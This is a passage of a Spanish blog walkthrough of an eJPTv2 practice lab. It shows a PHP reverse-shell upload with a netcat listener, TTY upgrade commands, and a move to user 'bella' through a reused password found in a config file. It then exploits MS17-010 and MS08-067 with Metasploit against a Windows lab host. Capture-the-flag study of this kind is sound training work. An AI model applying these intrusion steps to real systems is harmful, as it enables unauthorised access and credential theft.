+<p>Para la configuración vamos a indicar la IP de nuestra máquina atacante y el puerto por donde nos queremos poner a a la escucha, como veis ya nos esta indicando que necesitaremos privilegios de root para ponernos a la escucha(lo indica a la derecha en la parte de Listener)</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/rev_shell_monkey_pentester_doc.png"
+                      alt="Configuración de la reverse shell."
+                ><figcaption>Configuración de la reverse shell.</figcaption></figure></p>
+<p>Nos copiamos esto y lo metemos en un archivo, en mi caso rev.php.</p>
+<p>Ahora vamos a probar a subir el archivo(en mi caso lo tenía en un directorio de &#x2F;root lo he movido a un directorio accesible para el navegador, en mi caso &#x2F;home&#x2F;root&#x2F;kali&#x2F;Downloads). Le damos a actualizar.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/rev_shell_upload_panel_view_doc.png"
+                      alt="Como se ve el panel."
+                ><figcaption>Como se ve el panel.</figcaption></figure></p>
+<p>Ya vemos que se ha quedado como rarow, el siguiente paso es darle click derecho a la imagen y ver en la ruta en la que esta, vemos que la ha cambiado el nombre y sale una advertencia. Esta advertencia sale cuando la reverse shell intenta establecer una conexión con el equipo atacante(La ip y el puerto indicado anteriormente) y no ha podido).</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/warning_rev-shell_doc.png"
+                      alt="Aviso de la reverse shell."
+                ><figcaption>Aviso de la reverse shell.</figcaption></figure></p>
+<p>Bien, pues si nos ponemos en escucha:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nc -nlvp 443</span><br></pre></td></tr></table></figure></div>
+
+<p>Y recargamos el recurso.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/obtained_reverse_shell_doc.png"
+                      alt="Entramos como www-data."
+                ><figcaption>Entramos como www-data.</figcaption></figure></p>
+<p>Aquí a mi personalmente me gusta hacer un tratamiento de la tty para que funcione mejor, ctrl+c sin que se salga, ctrl+l para limpiar la consola, algunas veces configuro el tamaño de la terminal para que se vea bien cuando abres un editor de texto.</p>
+<p>Vamos a realizar lo siguiente:</p>
+<p>Lanzamos el siguiente script para mejorar</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>script -&gt; Para iniciar sesión en una sesión de terminal simulada. </li>
+<li>&#x2F;dev&#x2F;null -&gt; El destino de salida va a ser este. Así script no guarda un historial de la sesión y solo se usa para mejorar la tty.</li>
+<li>-c bash -&gt; Ejecutas un comando, en este caso bash dentro de la nueva sesión mejorada.</li>
+</ul>
+<p>Después realizamos un <strong>Ctrl+z</strong> para dejar la sesión en segundo plano.</p>
+<p>Después introducimos lo siguiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>stty -&gt; Nos permite modificar características de la tty.</li>
+<li>raw -&gt; Deshabilita el procesamiento de entrada y salida.</li>
+<li>echo -&gt; Desactiva la impresión de caracteres en pantalla, así evita que los acaracteres se dupliquen al escribir.</li>
+<li>fg -&gt; Trae la shell a primer plano.</li>
+</ul>
+<p>Después restablacete la terminal a su estado predeterminado limpiando posibles errores y define el tipo de terminal como xterm. Una vez dentro ya podemos hacer Ctrl+c sin miedo de salirnos de la sesión.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset xterm</span><br></pre></td></tr></table></figure></div>
+
+<p>Después para poder hacer ctrl+L tenemos que cambiar la terminal porque vemos que es tipo DUMB.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
+
+<p>Y por si utilizamos algún editor de texto(como nano&#x2F;vim) podemos obtener las filas y columnas en una terminal de nuestro equipo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">stty</span> size</span><br></pre></td></tr></table></figure></div>
+
+<p>Y ponérselas a la máquina víctima:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows 41 columns 112</span><br></pre></td></tr></table></figure></div>
+
+<p>Tenéis muchas variaciones a partir de aquí, podéis subir una webshell, un binario de msfvenom para que os establezca una conexión y conectaros con metasploit y crear una sesión meterpreter…</p>
+<h2 id="Escalada-de-privilegios-1"><a href="#Escalada-de-privilegios-1" class="headerlink" title="Escalada de privilegios"></a>Escalada de privilegios</h2><p>Deberíamos enumerar la red con el comando <code>ip a</code> por ejemplo, ver el &#x2F;etc&#x2F;passwd ara ver los usuarios del sistema y nos encontramos con el usuario <strong>bella</strong>. Podríamos realizar <code>sudo -l</code>, buscar binarios SUID, pero en este caso vamos enumerar los archivos del sistema. Si el usuario bella está en la aplicación web puede que podamos acceder a algún archivo de configuración donde aparezca sus credenciales.</p>
+<p>Nos podemos dirigir a la ruta que contiene este CMS:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/traffic_offense</span><br></pre></td></tr></table></figure></div>
+
+<p>Y vemos el archivo config.php al que www-data es propietario y tiene permisos delectura. Tenemos el archivo <strong>initialize.php</strong> que por el nombre podemos deducir que se crea con la instalación, así que vamos a echarle un vistazo, podría ser parecido al wp-config de wordpress.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/content_initialize_file_doc.png"
+                      alt="Contenido del archivo initalize.php."
+                ><figcaption>Contenido del archivo initalize.php.</figcaption></figure></p>
+<p>Y si, podemos ver la contraseña de bella en la base de datos, pero esto no significa que sea la misma que el usuario del sistema operativo, pero vamos a comprobar si se esta reutilizando esta.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/upgrade_to_bella_user_doc.png"
+                      alt="Nos convertimos al usuario bella."
+                ><figcaption>Nos convertimos al usuario bella.</figcaption></figure></p>
+<p>La escalada a root se sale del “scope” del eJPTv2 así que damos la máquina por concluida.</p>
+<h1 id="🎯-Experience"><a href="#🎯-Experience" class="headerlink" title="🎯 Experience"></a>🎯 Experience</h1><h2 id="Enumeracion-2"><a href="#Enumeracion-2" class="headerlink" title="Enumeración"></a>Enumeración</h2><p>En mi caso la IP relacionada con está máquina es la 10.0.2.9, así que nos creamos una carpeta(10.0.2.9) para tenerlo todo organizado.</p>
+<p>Si echamos un vistazo al escaneo de nmap podemos ver que los puertos abiertos son 135,139,445, parece ser una máquina Windows XP, mediante el NETBIOS podemos encontrar el nombre de la máquina.</p>
+<h3 id="smb-vuln-scripts-nmap"><a href="#smb-vuln-scripts-nmap" class="headerlink" title="smb-vuln scripts nmap"></a>smb-vuln scripts nmap</h3><p>En este caso vamos a ahorrarnos el paso de utilizar smbmap, smbclient…</p>
+<p>Vamos a buscar vulnerabilidades con lo scripts de nmap:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p445 --script=<span class="string">&quot;smb-vuln-*&quot;</span> 10.0.2.9 -oN smb-vulns.nmap</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/nmap_smb_vulns_experience.png"
+                      alt="Vulnerabilidades detectadas con los scripts de nmap."
+                ><figcaption>Vulnerabilidades detectadas con los scripts de nmap.</figcaption></figure></p>
+<p>En este caso nmap nos reporta que es vulnerable a ms17-010(Ethernal Blue), ms08-067 y cve2009-3103.</p>
+<p>La idea para seguir un poco la dinámica del eJPTv2 es utilizar metasploit para explotar estas vulns, ya que no tendremos conexión a internet para utilizar scripts.</p>
+<h2 id="Explotacion-2"><a href="#Explotacion-2" class="headerlink" title="Explotación"></a>Explotación</h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>Para utilizar la base de datos de metasploit nos tenemos que asegurar que el servicio postgresql está corriendo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure></div>
+
+<p>Podéis comprobar si esta encendido con:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql status</span><br></pre></td></tr></table></figure></div>
+
+<p>En caso de que service y preset aparezca como disabled no hay que preocuparse, esto significa que no se auto iniciará cuando se inicie la máquina.</p>
+<p>Ya podemos abrir metasploit</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></div>
+
+<p>Hacemos un <code>db_status</code> para ver si nuestra base de datos funciona correctamente.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/db_status_metasploit_experience.png"
+                      alt="Estatus de la base de datos."
+                ><figcaption>Estatus de la base de datos.</figcaption></figure></p>
+<p>Y para tenerlo todo más organizado nos vamos a crear un espacio de trabajo, para ello utilizamos los siguientes comandos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">workspace <span class="comment"># Ves los espacios de trabajo disponibles</span></span><br><span class="line">workspace -a 10.0.2.9 <span class="comment"># Creas un nuevo espacio de trabajo que se llama 10.0.2.9</span></span><br><span class="line">workspace -d 10.0.2.9 <span class="comment"># Borras el espacio de trabajo en caso de que fuera necesario</span></span><br><span class="line">workspace default <span class="comment"># Te cambias al espacio de trabajo default</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Bien, una vez en nuestro espacio de trabajo podríamos realizar muchas cosas, podríamos pasarle un archivo XML e importar el escaneo de nmap en metasploit(exactamente en este espacio de trabajo), podemos buscar los exploits directamente. Pero en este caso vamos a setear la IP objeto globalmente, así nos tenemos que ahorrar de introducir la IP en cada exploit y ya la seteara por defecto.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg RHOSTS 10.0.2.9</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="MS17-010-Eternal-Blue"><a href="#MS17-010-Eternal-Blue" class="headerlink" title="MS17-010 | Eternal Blue"></a>MS17-010 | Eternal Blue</h4><p>Esta vulnerabilidad se basa en un bufferoverflow hacía el servicio smb.<br>Bien, vamos a empezar explotando el eternal blue, que es muy común, para ello usamos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search MS17-010</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/search_results_ms17-010_metasploit_experience.png"
+                      alt="Resultados de la búsqueda."
+                ><figcaption>Resultados de la búsqueda.</figcaption></figure></p>
+<p>Lo que vemos que “cuelga” es información extra. Por ejemplo, en el primero te dice los sistemas operativos con lo que es compatible el exploit. Puedes elegir el exploit 0 y intenta detectar automáticamente que sistema operativo es y cuál usar o si lo tienes claro puedes utilizar un exploit de una versión directamente.</p>
+<p>En el segundo exploit podemos ver que tiene diferentes métodos de explotación y “AKA” se refiere a que es conocido por otros nombres.</p>
+<p>Hay que fijarse bien porque algunos no estan en la categoría de <strong>exploits</strong> si no de auxiliary en este caso.</p>
+<p>Tenemos un escaner para identificar si un equipo es vulnerable a eternal blue, vamos a utilizarlo:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure></div>
+
+<p>Si vemos las opciones requeridas para dicho escaner solo tendríamos que introducir el rhosts(sería con set RHOSTS 10.0.2.9) aunque no hace falta ya que lo hicimos de forma global anteriormente.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/show_options_scaner_eternalblue_metasploit_experience.png"
+                      alt="Opciones disponibles."
+                ><figcaption>Opciones disponibles.</figcaption></figure></p>
+<p>Para lanzar el escaner podemos utilizar <code>run</code> o <code>exploits</code>.</p>
+<p>Bien, pues como pudimos ver con nmap, la máquina 10.0.2.9 es vulnerable a metasploit.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/scaner_response_vuln_eternalblue_metasploit_experience.png"
+                      alt="Respuesta del escaner ms17-010."
+                ><figcaption>Respuesta del escaner ms17-010.</figcaption></figure></p>
+<p>Entonces si volvemos a buscar por ms17-017 y usamos el primero con <code>use 0</code>.<br>Lo mismo, miramos las opciones con <code>show options</code>, vemos también que por defecto se nos asigna el payload de meterpreter y las opciones a mirar son rhosts, rport, lhost y lport(4444 por defecto) así que no hace falta cambiar nada.</p>
+<p>Ejecutamos con <code>run</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/eternalblue_error_64bits_metasploit_experience.png"
+                      alt="Error indicando que el módulo solo soporta objetivos de x64 y este equipo es de x32."
+                ><figcaption>Error indicando que el módulo solo soporta objetivos de x64 y este equipo es de x32.</figcaption></figure></p>
+<p>Vamos a buscar otra vez por ms1-010 y utilizamos el segundo exploit:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure></div>
+
+<p>Miramos las opciones, todo igual, ejecutamos con <code>run</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/eternalblue_psexec_ok_metasploit_experience.png"
+                      alt="Obtenemos una sesión meterpreter como nt authority system."
+                ><figcaption>Obtenemos una sesión meterpreter como nt authority system.</figcaption></figure></p>
+<p>Podemos hacer un ctrl+z para mandar al background la sesión por si nos hiciera falta más adelante.</p>
+<h4 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h4><p>Mismo procedimiento, hacemos un search para buscar exploits y solo nos sale una:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/search_ms08-067_metasploit_experience.png"
+                      alt="Buscamos por la vulnerabilidad MS08-067."
+                ><figcaption>Buscamos por la vulnerabilidad MS08-067.</figcaption></figure></p>
+<p>Le indicamos que la queremos usar y su identificador <code>use 0</code> y vemos las opciones con <code>show options</code>. Lo dejamos todo por defecto como esta y ejecutamos con <code>run</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/exploiting_ms08-067_metasploit_experience.png"
+                      alt="Obteniendo una sesión explotando ms08-067."
+                ><figcaption>Obteniendo una sesión explotando ms08-067.</figcaption></figure></p>
+<h4 id="cve-2009-3103"><a href="#cve-2009-3103" class="headerlink" title="cve 2009-3103"></a>cve 2009-3103</h4><p>Buscamos por la vulnerabilidad 2009-3103 reportada con nmap, <code>search 2009-3103</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/search_2009-3103_metasploit_experience.png"
+                      alt="Buscamos por la vulnerabilidad 2009-3103"
+                ><figcaption>Buscamos por la vulnerabilidad 2009-3103</figcaption></figure></p>
+<p>Vemos que también se conoce como MS09-050. La usamos, vemos las opciones y ejecutamos. En este caso no ha funcionado, no todo podía ser un camino de rosas.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/exploiting_failed_2009-3103_metasploit_experience.png"
+                      alt="Explotación fallida del cve 2009-3103."
+                ><figcaption>Explotación fallida del cve 2009-3103.</figcaption></figure></p>
+<h1 id="Enlaces-de-interes"><a href="#Enlaces-de-interes" class="headerlink" title="Enlaces de interés"></a>Enlaces de interés</h1><ul>
+<li>Laboratorio de xerosec: <a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=v20IsEd5nUU" >https://www.youtube.com/watch?v=v20IsEd5nUU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ctf/">#ctf</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/linux/">#linux</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/windows/">#windows</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/pivoting/">#pivoting</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/movimiento-lateral/">#movimiento-lateral</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/eJPT/">#eJPT</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/easy/">#easy</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/id-rsa-cracking/">#id-rsa-cracking</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/path-hijacking/">#path-hijacking</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/smb/">#smb</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/wordpress/">#wordpress</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/lfi/">#lfi</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/nmap/">#nmap</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/fping/">#fping</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/arp-scan/">#arp-scan</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/netdiscover/">#netdiscover</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/dirb/">#dirb</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/dirbuster/">#dirbuster</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/smbclient/">#smbclient</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/smbmap/">#smbmap</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/crackmapexec/">#crackmapexec</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/netexec/">#netexec</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/enum4linux/">#enum4linux</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/wpscan/">#wpscan</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/searchsploit/">#searchsploit</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/john/">#john</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ssh2john/">#ssh2john</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>Artículos recomendados</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
+  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
+  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
+</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
+  <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
+  <span class="title">Blue | WriteUp</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>Artículos recomendados</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
+  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
+  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
+</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
+  <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
+  <span class="title">Blue | WriteUp</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/01/09/Blue/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Blue | WriteUp</span>
+						<span class="post-nav-item">Publicaciones siguientes</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comentarios
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://comments-sergiky.vercel.app',
+          lang: 'en-US',
+          dark: 'body[class~="dark-mode"]',
+          reaction: true,
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['QQ'],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">En esta página</div>
+		<div class="page-title">Laboratorio preparatorio ejptv2 | Xerosec</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Creacion-del-laboratorio"><span class="nav-text">Creación del laboratorio</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recursos-necesarios"><span class="nav-text">Recursos necesarios</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Configuracion-de-los-adaptadores-de-red"><span class="nav-text">Configuración de los adaptadores de red</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Configuracion-extra-maquinas"><span class="nav-text">Configuración extra máquinas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Maquina-Symfonos-1"><span class="nav-text">Máquina Symfonos 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple"><span class="nav-text">Simple</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Empezamos-el-laboratorio"><span class="nav-text">Empezamos el laboratorio</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Creacion-del-entorno-de-trabajo"><span class="nav-text">Creación del entorno de trabajo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Descubrimiento-de-hosts"><span class="nav-text">Descubrimiento de hosts</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escaneamos-puertos"><span class="nav-text">Escaneamos puertos</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escaneo-de-servicios-y-sus-versiones"><span class="nav-text">Escaneo de servicios y sus versiones</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Symfonos"><span class="nav-text">🎯 Symfonos</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ssh"><span class="nav-text">Ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Samba"><span class="nav-text">SMB&#x2F;Samba</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wordpress-en-h3l105"><span class="nav-text">Wordpress en h3l105</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Uso-de-WPScan"><span class="nav-text">Uso de WPScan</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh2john"><span class="nav-text">ssh2john</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalada-de-privilegios"><span class="nav-text">Escalada de privilegios</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Doc"><span class="nav-text">🎯 Doc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-1"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-1"><span class="nav-text">Web</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-1"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi"><span class="nav-text">SQLi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Upload"><span class="nav-text">File Upload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalada-de-privilegios-1"><span class="nav-text">Escalada de privilegios</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Experience"><span class="nav-text">🎯 Experience</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-2"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#smb-vuln-scripts-nmap"><span class="nav-text">smb-vuln scripts nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-2"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span 